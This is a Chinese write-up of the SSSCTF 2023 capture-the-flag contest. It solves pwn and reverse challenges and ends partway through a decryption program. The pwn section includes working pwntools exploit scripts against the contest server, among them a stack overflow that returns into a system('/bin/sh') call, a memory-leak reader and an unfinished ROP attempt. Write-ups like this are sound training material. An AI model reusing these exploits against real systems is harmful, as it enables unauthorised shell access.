---
title: SSSCTF 2023 Writeup
date: 2023-10-13T21:37:32+08:00
tags: [CTF]
---

## Pwn

### Test Your nc

根据题意，直接 nc 上环境读取 flag 文件即可。

```bash
            .-/+oossssoo+/-.               ctf@87b124f497ea
        `:+ssssssssssssssssss+:`           ----------------
      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 22.04.3 LTS x86_64
    .ossssssssssssssssssdMMMNysssso.       Host: OptiPlex 5050
   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 6.1.0-11-amd64
  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 18 days, 18 hours, 41 mins
 /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 326 (dpkg)
.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: sh
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Terminal: pwn
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   CPU: Intel i7-7700 (8) @ 4.200GHz
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: Intel HD Graphics 630
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Memory: 2586MiB / 31960MiB
.ssssssssdMMMNhsssssssssshNMMMdssssssss.
 /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/
  +sssssssssdmydMMMMMMMMddddyssssssss+
   /ssssssssssshdmNNNNmyNMMMMhssssss/
    .ossssssssssssssssssdMMMNysssso.
      -+sssssssssssssssssyyyssss+-
        `:+ssssssssssssssssss+:`
            .-/+oossssoo+/-.


$ cat flag
flag{a35753bf-48c8-4380-b22a-40079aca9f17}
```

### Hack Traffic Light

> 在某些智能红绿灯控制系统中，**总控中心**可以向各个红绿灯对应的**控制器**发送无线信号，来设置当前红绿灯的状态。  
> **红绿灯控制器**接收并解析 来自总控中心的无线信号，从而改变当前红绿灯的状态  
> 假设你已经在某个红绿灯控制器上安装了后门程序，可以劫获**总控中心**向该**控制器**发送的信号并进行伪造。像电影里一样，黑一把红绿灯吧！
>
> 将红、黄、绿灯分别设置成 165、17、241 秒，你会收到我给你的 flag

首先 nc 连接上环境，发现信号格式为 6 位 16 进制，猜测可能与 16 进制 RGB 表示类似，将题目要求的 165、17、241 分别转换为 16 进制得到 a511f1。

```bash
Welcome to the backdoor program in haking the traffic light!!!


Press ENTER to START

============================!!!!!!!!!!!!============================
截获了一串二进制01信号，已提取出其中的有用信息并转换成16进制
当前信号为：28035A
====================================================================

请输入以下数字完成操作
1. 篡改信号
2. 直接发送信号
3. 退出

>1
请输入修改后的16进制信号:a511f1
本周期内
红灯 241 秒     黄灯 17 秒      绿灯 165 秒


Press ENTER to START
```

发现修改结果正好相反，所以输入应该是绿灯、黄灯、红灯的顺序。修改输入为 f111a5 即可得到 flag。

```bash
============================!!!!!!!!!!!!============================
截获了一串二进制01信号，已提取出其中的有用信息并转换成16进制
当前信号为：23032D
====================================================================

请输入以下数字完成操作
1. 篡改信号
2. 直接发送信号
3. 退出

>1
请输入修改后的16进制信号:f111a5
本周期内
红灯 165 秒     黄灯 17 秒      绿灯 241 秒
看来你已经掌握了如何拿下红绿灯， 这是你的奖励
flag{349346ee-1294-4f9d-890d-c0491d4925d9}
```

### fILE dESCRIPTOR

> 你知道什么是文件描述符(fd) 吗？

审查源代码，可以发现我们需要指定一个输入流，一个输出流。根据 fd 的特性，我们可以计算各个流的 fd 值。

```c
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

int main() {
  setbuf(stdin, 0LL);                   // 0: stdin
  setbuf(stdout, 0LL);                  // 1: stdout
  setbuf(stderr, 0LL);                  // 2: stderr

  int input1 = 0, input2 = 0;
  char buf[0x20];
  memset(buf, 0, 0x20);

  puts("Input the file discriptor you want to read from.");
  scanf("%d",&input1);

  puts("Input the file discriptor you want to write at.");
  scanf("%d",&input2);

  int null = open("/dev/null",O_RDWR);    // 3: null
  if(null < 0 ){
    fprintf(stderr,"open /dev/null fail");
  }
  dup(STDIN_FILENO);                      // 4: stdin
  dup(STDOUT_FILENO);                     // 5: stdout
  dup(STDERR_FILENO);                     // 6: stderr
  dup2(null,STDIN_FILENO);                // 0: null
  dup2(null,STDOUT_FILENO);               // 1: null
  dup2(null,STDERR_FILENO);               // 2: null

  open("/flag",O_RDONLY);                 // 7: flag
  read(input1,buf,0x20);
  write(input2,buf,0x20);
  return 0;
}
```

我们需要将 fd 为 7 的 flag 输出到标准输出流中，因为默认 fd 为 1 的输出流被重定向到 null，所以我们需要使用复制后 fd 为 5 的输出流来输出。

```bash
Input the file discriptor you want to read from.
7
Input the file discriptor you want to write at.
5
flag{7bcadfdb-e8f5-4385-989c-8035d8da4530}
```

### Strange Graphics

> 擅长几何的人，绘图也不赖吧……
>
> 注意，flag 格式为 SSSCTF{}

第一题要求长宽至少为 9，但是周长要小于 18，正常来说`4*9=32`无法达到要求，注意到题目说明只使用类型 int，考虑使用溢出。

```bash
Wecome to the SSSCTF!
Only use integers(int):
Can you draw three traditional geometric figures for me?
The first is a rectangle:
Its length > 9,its width > 9 and its circumference <18.
Your show time:
The lenth you draw:2100000000
The width you draw:2100000000
```

第二题仍然需要溢出，但是对结果进行了要求，可以通过简单的计算得到满足要求的一组解：

因为 int 最大可以表示 2^32=4294967296 个数，所以对于一个 int，把它加上 4294967296 还等于它本身。这里我们要得到 9，那么就是要得到 4294967296 + 9 = 4294967305。对 4294967305 进行质因数分解可以刚好得到三个数 5、9629、89209。

```bash
The second is a cuboid:
Its length > 9,its width > 9 ,its height > 4,and its volume =9.
Your show time:
The lenth you draw:89209
The width you draw:9629
The height you draw:5
```

第三题要求除数不能为 0，但是要产生错误，可以考虑使用除法溢出。

```bash
The third is a right triangle:
Its base is not zero and its height/base will signal an ERROR
Your show time:
The base you draw:-1
The height you draw:-2147483648
You are a real drawing master!!!
SSSCTF{PWN_1S_AN_3L3GANT_ART_AS_DRAW1NG}
```

### man gets

> 在你的 linux 操作系统 输入 man gets 你发现了什么 O.o?

```c
#include <stdio.h>
#include <stdlib.h>


int main()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);

  puts("It is a baby stack overflow without protection!!!!!\nI can work this out easily");
  puts("Type 'man gets' on your linux termimal.\nWhat do you find?");

  char buf[0x20];
  gets(buf);
  return 0;
}

void can_can_need(){
  system("/bin/sh");
}
```

```bash
$ checksec man_gets
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

根据源码猜测，本题需要通过 gets 函数存在的漏洞来实行栈溢出。gets 函数将会向一个地址写入数据直到遇到换行符或者 EOF，所以我们可以不断填充数据来覆盖栈后方的 ret 地址，从而跳转到`can_can_need`函数。

在 ida 中打开二进制文件，定位到`main`函数所在位置：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("It is a baby stack overflow without protection!!!!!\nI can work this out easily");
  puts("Type 'man gets' on your linux termimal.\nWhat do you find?");
  gets(v4);
  return 0;
}
```

可以发现 buf 的地址为`rbp-20h`，因此可以推算出偏移量为`20h (buf) + 8h (rbp) = 28h`。

查找`can_can_need`函数所在位置为`0000000000401214`，尝试后发现没有成功执行到`system("/bin/sh")`，是因为`system`函数有地址对齐要求，所以选择`push`指令之后的地址来跳过`push`，从而满足要求。

```c
.text:0000000000401214                 public can_can_need
.text:0000000000401214 can_can_need    proc near
.text:0000000000401214 ; __unwind {
.text:0000000000401214                 endbr64
.text:0000000000401218                 push    rbp
.text:0000000000401219                 mov     rbp, rsp
.text:000000000040121C                 lea     rax, command    ; "/bin/sh"
.text:0000000000401223                 mov     rdi, rax        ; command
.text:0000000000401226                 call    _system
.text:000000000040122B                 nop
.text:000000000040122C                 pop     rbp
.text:000000000040122D                 retn
.text:000000000040122D ; } // starts at 401214
.text:000000000040122D can_can_need    endp
.text:000000000040122D
.text:000000000040122D _text           ends
.text:000000000040122D
```

exp：

```python
import pwn

conn = pwn.remote("210.30.97.133", 10012)
conn.recvuntil(b"?\n")
conn.sendline(b"a" * 0x28 + pwn.p64(0x40121C))
conn.interactive()
```

### yskM

> you should know virtual memory

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

char flag1[0x40];

int main() {
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);

  puts("you should know Me\n");

  int flag_fd = open("/flag",O_RDONLY);
  int secret_fd = open("/TOPSECRET",O_RDONLY);
  if(flag_fd < 0 || secret_fd < 0){
    fprintf(stderr, "open error!");
    exit(-1);
  }
  char flag2[0x40]= {0};
  char* flag3 = mmap(0,0x40, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (flag3 == MAP_FAILED) {
    fprintf(stderr, "mmap failed");
    exit(-1);
  }
  read(flag_fd, flag1, 14);
  read(flag_fd, flag2, 14);
  read(flag_fd, flag3, 14);

  char* somewhere = malloc(100);
  char* somewhere_else = malloc(100);
  read(secret_fd, somewhere_else, 0x40);


  puts("Here is the virtual memory mapping of this process");
  puts("Can you find where the flag is?");

  int maps_fd = open("/proc/self/maps",O_RDONLY);
  if(maps_fd < 0){
    fprintf(stderr, "open /proc/self/maps error");
    exit(-1);
  }
  char maps[0x1000] = {0};
  read(maps_fd, maps, 0x1000);
  write(STDOUT_FILENO, maps, 0x1000);

  puts("Since you're not familiar with debuging, I will give you a hint.");
  printf("The address of flag3 which is a pointer is %p\n", &flag3);

  puts("You have 4 chances");
  for(int i = 0; i < 4; i++){
    void* input = 0;
    printf("Give me an address: ");
    scanf("%p", &input);
    write(STDOUT_FILENO, input, 0x40);
    printf("\n");
  }

  puts("\nDo you find what you want?\nIf not, try again and try to use pwntools.");
  return 0;
}
```

分析源代码可知，flag1 为未初始化的全局变量，在`.bss`段中。flag2 在栈中的某一块区域，因为紧随 flag3 定义，又给了 flag3 的地址，所以可以利用 flag3 的地址减去 8 来得到 flag2 的值。flag3 在栈中的一块私有匿名区域。secret 在堆中的某个地方，通过爆破得知 secret 在`[heap]+310h`的位置。

exp：

```python
import pwn

conn = pwn.remote("210.30.97.133", 10078)
conn.recvuntil(b"Can you find where the flag is?\n")
maps = str(
    conn.recvuntil(
        b"Since you're not familiar with debuging, I will give you a hint.\n"
    ),
    "utf-8",
).split("\n")

flag1_p = int(list(filter(lambda x: "/pwn/pwn" in x, maps))[4][:12], 16) + 0x40
flag3_p = int(maps[17][:12], 16)
heap_p = int(list(filter(lambda x: "[heap]" in x, maps))[0][:12], 16) + 0x310

conn.recvuntil(b"The address of flag3 which is a pointer is ")
flag3_pp = int(conn.recvline(), 16)

conn.recvuntil(b"Give me an address: ")
conn.sendline(bytes(hex(flag1_p), "utf-8"))
flag1 = conn.recvline()[32:46]

conn.recvuntil(b"Give me an address: ")
conn.sendline(bytes(hex(flag3_pp), "utf-8"))
flag2 = conn.recvline()[32:46]

conn.recvuntil(b"Give me an address: ")
conn.sendline(bytes(hex(flag3_p), "utf-8"))
flag3 = conn.recvline()[:14]

conn.recvuntil(b"Give me an address: ")
conn.sendline(bytes(hex(heap_p), "utf-8"))
secret = conn.recvline()

print(flag1 + flag2 + flag3)
print(secret)
```

### Spirit-4calls

第一次调用`scanf`来将 rdi 设置为栈上的某一个地址，第二次调用`gets`来进行 rop。

```python
from pwn import *

gets = 0x805a0
puts = 0x80ED0
scanf = 0x60C40

conn = remote("210.30.97.133", 10043)
# conn = process("./pwn")

conn.recvuntil(b"Here is your gift: ")

libc_p = int(conn.recvline(), 16)
print("libc_p", hex(libc_p))

conn.recvuntil(b"Here we go!\n\n")

#gdb.attach(proc.pidof(conn)[0])

conn.send(p64(libc_p + scanf))
conn.send(p64(libc_p + gets))
conn.send(p64(libc_p + puts))
conn.send(p64(libc_p + puts))

sleep(0.1)

conn.send(b'a'*100) # TODO

conn.interactive()
```

## REVERSE

### 一击致命

> 投机取巧是逆向的一部分(使用 ida 破解版或 ghidra 或任何你喜欢的方式把 exe 还原会代码吧）

将题目提供的 exe 文件丢入 ida 中，查找后发现`flag{th1s_i5_a_fak3flag}`。审计后发现 fakeflag 附近是游戏代码区域，在 while 循环前下断点，之后直接将 rip 设置到`00007FF74AC92361`即可直接结束游戏，得到 flag 为`flag{Welc0me_T0_Scr123w}`。

### 操控加密

> 已知明文攻击！

```bash
我是一个加密机，你的flag已经被我加密了！
这是你的flag:
d3b8d80a0366d9d9667628bcabfa8c6676a1fa285bd3d3faab768c08faa166bc6608d32ed85b00246613
但是因为这是招新赛，我给你使用我的机会，你可以输入明文，我会使用加密flag相同的方式进行加密
请输入数据:
```

直接将字母、数字和`{}`输入后得到相应的密文，然后一一替换即可得到 flag

### 最终审计

```c
#include <stdio.h>
#include<stdint.h>
#include<string.h>
uint8_t lIIIIlIllIlllIll[256] = {
  101,  27, 192,  94,  58,  31,  23, 165, 105, 244,
  153, 151,  71, 160, 194, 152,  89,  73,  95, 119,
  130,  51, 197, 186, 212,  65,  25, 219, 148, 235,
   86, 164, 138,   9, 143, 111, 158, 171, 246,  18,
   55, 134, 250, 245, 233, 248,   3, 222,  90, 204,
   45,  39,  96,  54,  10, 229, 154,  48, 181, 145,
  166, 238, 126,  97,  38, 109, 150,  70, 207, 216,
  146, 170,  92, 228,  60, 177, 247, 182, 180,  13,
  139,  50,  74,  22, 118,  26,  53,  77, 185,  61,
  203, 230, 172, 123, 218, 116,  68, 178, 135, 190,
   43,  37, 173,  36, 208,  11,  40,  24,  14, 240,
   84,   8,  52, 239,  83, 191, 193, 196, 122, 210,
    6, 140, 254, 242,  69, 110, 132, 195,  17, 253,
   20, 115,  56, 124,   1, 217, 213, 241, 252, 120,
   75, 224, 108,  30, 201,  78,  85, 237, 211, 188,
  255,  33,  44, 128, 141,  42,  19,  87, 167, 214,
    2,  93, 174, 249, 121, 100, 209,  67, 161, 156,
  162, 205,  21, 234, 176, 206,  49, 175,  99, 103,
  114, 163, 113,  80,  59, 225,  76, 183, 159, 112,
    5, 251, 184,  79, 149, 117,  35, 168, 236, 200,
  133,  88,  63,  29, 102, 227,  98,  16,   4,   0,
   81, 155, 198,  34, 142, 202,  12, 131, 136, 157,
   57, 189, 107, 129, 199,  64,  47,  41, 179, 104,
    7, 106,  91, 137, 215,  72, 232, 187,  15, 231,
  144, 147,  28,  66, 221, 226, 127, 243,  46,  82,
   62, 169, 125,  32, 220, 223
};
uint8_t llllIIIlIllllIll[256] = {
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
};

uint8_t IIIIllllIIIlIlll(uint8_t a, uint8_t b)
{
    uint8_t i;
    uint8_t temp;
    uint8_t result[8];
    uint8_t sum = 0;
    result[0] = a;
    for (i = 1; i < 8; i++)
    {
        temp = result[i - 1];
        temp = temp >> 7;
        if (temp == 1)
        {
            result[i] = result[i - 1] << 1 ^ 0x1b;
        }
        else
        {
            result[i] = result[i - 1] << 1;
        }
    }
    for (i = 0; i < 8; i++) {
        temp = b << i & 0x80;
        if (temp == 0x80)
        {
            sum ^= result[7 - i];
        }
    }
    return sum;
}

void IIIllIllIIlIlIIl(uint8_t K[16], uint8_t k[11][16])
{
    uint8_t RC[10];
    uint32_t v4[10];
    RC[0] = 1;
    int i;
    for (i = 1; i < 10; i++)
        RC[i] = IIIIllllIIIlIlll(0x02, RC[i - 1]);
    for (i = 0; i < 16; i++)
        k[0][i] = K[i];
    for (i = 1; i < 11; i++)
    {
        k[i][0] = k[i - 1][0] ^ lIIIIlIllIlllIll[k[i - 1][13]] ^ RC[10 - i];
        k[i][1] = k[i - 1][1] ^ lIIIIlIllIlllIll[k[i - 1][14]];
        k[i][2] = k[i - 1][2] ^ lIIIIlIllIlllIll[k[i - 1][15]];
        k[i][3] = k[i - 1][3] ^ lIIIIlIllIlllIll[k[i - 1][12]];
        k[i][4] = k[i - 1][4] ^ k[i][0];
        k[i][5] = k[i - 1][5] ^ k[i][1];
        k[i][6] = k[i - 1][6] ^ k[i][2];
        k[i][7] = k[i - 1][7] ^ k[i][3];
        k[i][8] = k[i - 1][8] ^ k[i][4];
        k[i][9] = k[i - 1][9] ^ k[i][5];
        k[i][10] = k[i - 1][10] ^ k[i][6];
        k[i][11] = k[i - 1][11] ^ k[i][7];
        k[i][12] = k[i - 1][12] ^ k[i][8];
        k[i][13] = k[i - 1][13] ^ k[i][9];
        k[i][14] = k[i - 1][14] ^ k[i][10];
        k[i][15] = k[i - 1][15] ^ k[i][11];
    }
}

void IlIlIllIIIIIIlIl(uint8_t* a, uint8_t* IIIlIIIIIllllIIl) {
    for (int i = 0; i < 16; i++)
        a[i] ^= IIIlIIIIIllllIIl[i];
}

void IIlIlIlIlIIllIII(uint8_t* input) {
    for (int i = 0; i < 16; i++)
        input[i] = lIIIIlIllIlllIll[input[i]];
}
void llIllIIlIlIlIlIl(uint8_t* input) {
    for (int i = 0; i < 16; i++)
        input[i] = llllIIIlIllllIll[input[i]];
}

void IlIIllIIIIlIlllI(uint8_t* a) {
    uint8_t b[16];
    b[0] = a[0];    b[4] = a[4];    b[8] = a[8];    b[12] = a[12];
    b[1] = a[5];    b[5] = a[9];    b[9] = a[13];    b[13] = a[1];
    b[2] = a[10];    b[6] = a[14];    b[10] = a[2];    b[14] = a[6];
    b[3] = a[15];    b[7] = a[3];    b[11] = a[7];    b[15] = a[11];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}
void IlIlIIIIllIIllII(uint8_t* a) {
    uint8_t b[16];
    b[0] = a[0];    b[4] = a[4];    b[8] = a[8];    b[12] = a[12];
    b[1] = a[13];    b[5] = a[1];    b[9] = a[5];    b[13] = a[9];
    b[2] = a[10];    b[6] = a[14];    b[10] = a[2];    b[14] = a[6];
    b[3] = a[7];    b[7] = a[11];    b[11] = a[15];    b[15] = a[3];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}


void IIIIIIIIIlllIIII(uint8_t* a) {
    uint8_t b[16];
    b[0] = IIIIllllIIIlIlll(0x02, a[0]) ^ IIIIllllIIIlIlll(0x03, a[1]) ^ a[2] ^ a[3];
    b[1] = IIIIllllIIIlIlll(0x02, a[1]) ^ IIIIllllIIIlIlll(0x03, a[2]) ^ a[3] ^ a[0];
    b[2] = IIIIllllIIIlIlll(0x02, a[2]) ^ IIIIllllIIIlIlll(0x03, a[3]) ^ a[0] ^ a[1];
    b[3] = IIIIllllIIIlIlll(0x02, a[3]) ^ IIIIllllIIIlIlll(0x03, a[0]) ^ a[1] ^ a[2];
    b[4] = IIIIllllIIIlIlll(0x02, a[4]) ^ IIIIllllIIIlIlll(0x03, a[5]) ^ a[6] ^ a[7];
    b[5] = IIIIllllIIIlIlll(0x02, a[5]) ^ IIIIllllIIIlIlll(0x03, a[6]) ^ a[7] ^ a[4];
    b[6] = IIIIllllIIIlIlll(0x02, a[6]) ^ IIIIllllIIIlIlll(0x03, a[7]) ^ a[4] ^ a[5];
    b[7] = IIIIllllIIIlIlll(0x02, a[7]) ^ IIIIllllIIIlIlll(0x03, a[4]) ^ a[5] ^ a[6];
    b[8] = IIIIllllIIIlIlll(0x02, a[8]) ^ IIIIllllIIIlIlll(0x03, a[9]) ^ a[10] ^ a[11];
    b[9] = IIIIllllIIIlIlll(0x02, a[9]) ^ IIIIllllIIIlIlll(0x03, a[10]) ^ a[11] ^ a[8];
    b[10] = IIIIllllIIIlIlll(0x02, a[10]) ^ IIIIllllIIIlIlll(0x03, a[11]) ^ a[8] ^ a[9];
    b[11] = IIIIllllIIIlIlll(0x02, a[11]) ^ IIIIllllIIIlIlll(0x03, a[8]) ^ a[9] ^ a[10];
    b[12] = IIIIllllIIIlIlll(0x02, a[12]) ^ IIIIllllIIIlIlll(0x03, a[13]) ^ a[14] ^ a[15];
    b[13] = IIIIllllIIIlIlll(0x02, a[13]) ^ IIIIllllIIIlIlll(0x03, a[14]) ^ a[15] ^ a[12];
    b[14] = IIIIllllIIIlIlll(0x02, a[14]) ^ IIIIllllIIIlIlll(0x03, a[15]) ^ a[12] ^ a[13];
    b[15] = IIIIllllIIIlIlll(0x02, a[15]) ^ IIIIllllIIIlIlll(0x03, a[12]) ^ a[13] ^ a[14];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void llIlIllIllIIIllI(uint8_t* a)
{
    uint8_t b[16];
    b[0] = IIIIllllIIIlIlll(0x0E, a[0]) ^ IIIIllllIIIlIlll(0x0B, a[1]) ^ IIIIllllIIIlIlll(0x0D, a[2]) ^ IIIIllllIIIlIlll(0x09, a[3]);
    b[1] = IIIIllllIIIlIlll(0x0E, a[1]) ^ IIIIllllIIIlIlll(0x0B, a[2]) ^ IIIIllllIIIlIlll(0x0D, a[3]) ^ IIIIllllIIIlIlll(0x09, a[0]);
    b[2] = IIIIllllIIIlIlll(0x0E, a[2]) ^ IIIIllllIIIlIlll(0x0B, a[3]) ^ IIIIllllIIIlIlll(0x0D, a[0]) ^ IIIIllllIIIlIlll(0x09, a[1]);
    b[3] = IIIIllllIIIlIlll(0x0E, a[3]) ^ IIIIllllIIIlIlll(0x0B, a[0]) ^ IIIIllllIIIlIlll(0x0D, a[1]) ^ IIIIllllIIIlIlll(0x09, a[2]);
    b[4] = IIIIllllIIIlIlll(0x0E, a[4]) ^ IIIIllllIIIlIlll(0x0B, a[5]) ^ IIIIllllIIIlIlll(0x0D, a[6]) ^ IIIIllllIIIlIlll(0x09, a[7]);
    b[5] = IIIIllllIIIlIlll(0x0E, a[5]) ^ IIIIllllIIIlIlll(0x0B, a[6]) ^ IIIIllllIIIlIlll(0x0D, a[7]) ^ IIIIllllIIIlIlll(0x09, a[4]);
    b[6] = IIIIllllIIIlIlll(0x0E, a[6]) ^ IIIIllllIIIlIlll(0x0B, a[7]) ^ IIIIllllIIIlIlll(0x0D, a[4]) ^ IIIIllllIIIlIlll(0x09, a[5]);
    b[7] = IIIIllllIIIlIlll(0x0E, a[7]) ^ IIIIllllIIIlIlll(0x0B, a[4]) ^ IIIIllllIIIlIlll(0x0D, a[5]) ^ IIIIllllIIIlIlll(0x09, a[6]);
    b[8] = IIIIllllIIIlIlll(0x0E, a[8]) ^ IIIIllllIIIlIlll(0x0B, a[9]) ^ IIIIllllIIIlIlll(0x0D, a[10]) ^ IIIIllllIIIlIlll(0x09, a[11]);
    b[9] = IIIIllllIIIlIlll(0x0E, a[9]) ^ IIIIllllIIIlIlll(0x0B, a[10]) ^ IIIIllllIIIlIlll(0x0D, a[11]) ^ IIIIllllIIIlIlll(0x09, a[8]);
    b[10] = IIIIllllIIIlIlll(0x0E, a[10]) ^ IIIIllllIIIlIlll(0x0B, a[11]) ^ IIIIllllIIIlIlll(0x0D, a[8]) ^ IIIIllllIIIlIlll(0x09, a[9]);
    b[11] = IIIIllllIIIlIlll(0x0E, a[11]) ^ IIIIllllIIIlIlll(0x0B, a[8]) ^ IIIIllllIIIlIlll(0x0D, a[9]) ^ IIIIllllIIIlIlll(0x09, a[10]);
    b[12] = IIIIllllIIIlIlll(0x0E, a[12]) ^ IIIIllllIIIlIlll(0x0B, a[13]) ^ IIIIllllIIIlIlll(0x0D, a[14]) ^ IIIIllllIIIlIlll(0x09, a[15]);
    b[13] = IIIIllllIIIlIlll(0x0E, a[13]) ^ IIIIllllIIIlIlll(0x0B, a[14]) ^ IIIIllllIIIlIlll(0x0D, a[15]) ^ IIIIllllIIIlIlll(0x09, a[12]);
    b[14] = IIIIllllIIIlIlll(0x0E, a[14]) ^ IIIIllllIIIlIlll(0x0B, a[15]) ^ IIIIllllIIIlIlll(0x0D, a[12]) ^ IIIIllllIIIlIlll(0x09, a[13]);
    b[15] = IIIIllllIIIlIlll(0x0E, a[15]) ^ IIIIllllIIIlIlll(0x0B, a[12]) ^ IIIIllllIIIlIlll(0x0D, a[13]) ^ IIIIllllIIIlIlll(0x09, a[14]);
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}


void IIIIIIIIIlllIIIl(uint8_t lllIIIllllIlIIlI[16], uint8_t lIlIIIIIllllIlIl[16], uint8_t k[11][16], int Round)
{
    int i, round;
    for (i = 0; i < 16; i++) {
        lIlIIIIIllllIlIl[i] = lllIIIllllIlIIlI[i];
    }
    IlIlIllIIIIIIlIl(lIlIIIIIllllIlIl, k[0]);
    for (round = 1; round < Round; round++) {
        IIIIIIIIIlllIIII(lIlIIIIIllllIlIl);
        IIlIlIlIlIIllIII(lIlIIIIIllllIlIl);
        IlIIllIIIIlIlllI(lIlIIIIIllllIlIl);

        IlIlIllIIIIIIlIl(lIlIIIIIllllIlIl, k[round]);
    }
    IIlIlIlIlIIllIII(lIlIIIIIllllIlIl);
    IlIIllIIIIlIlllI(lIlIIIIIllllIlIl);
    IlIlIllIIIIIIlIl(lIlIIIIIllllIlIl, k[Round]);
}


int main()
{
    int i = 0;
    uint8_t llIlllIllIlIlIll[11][16];
    uint8_t IIlIIIIIIlIIlIIl[16] = { 218,14,205,50,168,89,88,62,25,222,96,18,18,129,198,36};
    uint8_t lIlIIIIIllllIlIl[17];
    uint8_t lllIIIllllIlIIlI[17];
    uint8_t llllIllIllIIllII[16] = {
0x5A, 0x0D, 0x9D, 0x04, 0x60, 0xAE, 0x05, 0xBB, 0x85, 0x6B,
0x13, 0xB5, 0x73, 0xCF, 0x3D, 0x1E
    };

    for (int a = 0; a < 16; a++) {
        lllIIIllllIlIIlI[a] = getchar();
    lIlIIIIIllllIlIl[a] = 0;
     }
    lllIIIllllIlIIlI[16] = 0;
  for(int a=0;a<11;a++){
    for(int b=0;b<16;b++){
      llIlllIllIlIlIll[a][b] = 0;
    }
  }
   IIIllIllIIlIlIIl(llllIllIllIIllII, llIlllIllIlIlIll);
     IIIIIIIIIlllIIIl(lllIIIllllIlIIlI,lIlIIIIIllllIlIl,llIlllIllIlIlIll,10);
     for(i=0;i<16;i++){
         if (lIlIIIIIllllIlIl[i] != IIlIIIIIIlIIlIIl[i]) {

             printf("Error!");
             return 0;
        }
     }
     printf("Right!");
     printf("Your flag: flag{%16s}", lllIIIllllIlIIlI);
    return 0;
}
```

反混淆并进行审计后得到解密代码：

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

void printhex(uint8_t *a)
{
    for (int i = 0; i < 16; i++)
        printf("%02x ", a[i]);
    printf("\n");
}

uint8_t table1[256] = {
        101, 27, 192, 94, 58, 31, 23, 165, 105, 244,
        153, 151, 71, 160, 194, 152, 89, 73, 95, 119,
        130, 51, 197, 186, 212, 65, 25, 219, 148, 235,
        86, 164, 138, 9, 143, 111, 158, 171, 246, 18,
        55, 134, 250, 245, 233, 248, 3, 222, 90, 204,
        45, 39, 96, 54, 10, 229, 154, 48, 181, 145,
        166, 238, 126, 97, 38, 109, 150, 70, 207, 216,
        146, 170, 92, 228, 60, 177, 247, 182, 180, 13,
        139, 50, 74, 22, 118, 26, 53, 77, 185, 61,
        203, 230, 172, 123, 218, 116, 68, 178, 135, 190,
        43, 37, 173, 36, 208, 11, 40, 24, 14, 240,
        84, 8, 52, 239, 83, 191, 193, 196, 122, 210,
        6, 140, 254, 242, 69, 110, 132, 195, 17, 253,
        20, 115, 56, 124, 1, 217, 213, 241, 252, 120,
